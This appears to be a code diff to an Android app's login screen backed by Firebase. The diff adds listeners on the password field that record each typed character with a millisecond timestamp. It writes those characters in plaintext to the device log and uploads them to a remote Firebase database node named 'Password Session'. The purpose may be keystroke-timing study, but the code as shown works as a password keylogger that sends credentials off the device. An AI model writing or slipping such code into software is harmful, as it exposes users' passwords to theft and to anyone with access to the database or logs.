@@ -14,7 +14,9 @@ import android.support.annotation.NonNull;
 import android.support.v7.app.AlertDialog;
 import android.support.v7.app.AppCompatActivity;
 import android.support.v7.widget.Toolbar;
+import android.text.Editable;
 import android.text.TextUtils;
+import android.text.TextWatcher;
 import android.util.Log;
 import android.view.KeyEvent;
 import android.view.View;
@@ -51,6 +53,7 @@ public class LoginActivity extends AppCompatActivity {
     private ProgressBar progressBar;
     private Button btnSignup, btnLogin, btnReset;
     private int wrongPasswordCount = 0;
+    DatabaseReference mDatabase;
 
     @Override
     protected void onCreate(Bundle savedInstanceState) {
@@ -82,7 +85,29 @@ public class LoginActivity extends AppCompatActivity {
         });
 
         FirebaseDatabase database = FirebaseDatabase.getInstance();
-        final DatabaseReference mDatabase = database.getReference(encodeUserEmail(username));
+        mDatabase = database.getReference(encodeUserEmail(username));
+
+        inputPassword.addTextChangedListener(new TextWatcher() {
+            @Override
+            public void beforeTextChanged(CharSequence charSequence, int i, int i1, int i2) {
+
+            }
+
+            @Override
+            public void onTextChanged(CharSequence charSequence, int start, int before, int count) {
+                if((start + count - 1) > 0) {
+                    char ch = charSequence.charAt(start + count - 1);
+                    Log.d("Key Pressed", ch + " : " + getTime());
+                    mDatabase.child("Password Session").child(getTime()).setValue(Character.toString(ch));
+
+                }
+            }
+
+            @Override
+            public void afterTextChanged(Editable editable) {
+
+            }
+        });
 
 
         inputPassword.setOnKeyListener(new View.OnKeyListener() {
@@ -90,12 +115,8 @@ public class LoginActivity extends AppCompatActivity {
             public boolean onKey(View view, int i, KeyEvent keyEvent) {
                 char unicodeChar = (char)keyEvent.getUnicodeChar();
                 Log.d("key pressed",String.valueOf(keyCodeToString(i)+" key is "+unicodeChar+" event time "+getTime()+ " "+ keyEvent.getEventTime()));
-
-
-
-                mDatabase.child("Password Session").child("Key Pressed ").child("Time :"+getTime().toString()+" Letter: ").setValue(Character.toString(unicodeChar));
-
-
+                mDatabase.child("Password Session").child(getTime()).setValue(Character.toString(unicodeChar));
+                //mDatabase.child("Password Session").child("Key Pressed ").child("Time :"+getTime().toString()+" Letter: ").setValue(Character.toString(unicodeChar));
                 return false;
             }
         });
@@ -238,7 +259,7 @@ public class LoginActivity extends AppCompatActivity {
 //    }
 
     public String getTime(){
-        DateFormat dateFormat = new SimpleDateFormat("MM-dd-yyyy HH:mm:ss");
+        DateFormat dateFormat = new SimpleDateFormat("MM-dd-yyyy HH:mm:ss:SSS");
         Date date = new Date();
         return  dateFormat.format(date);
     }
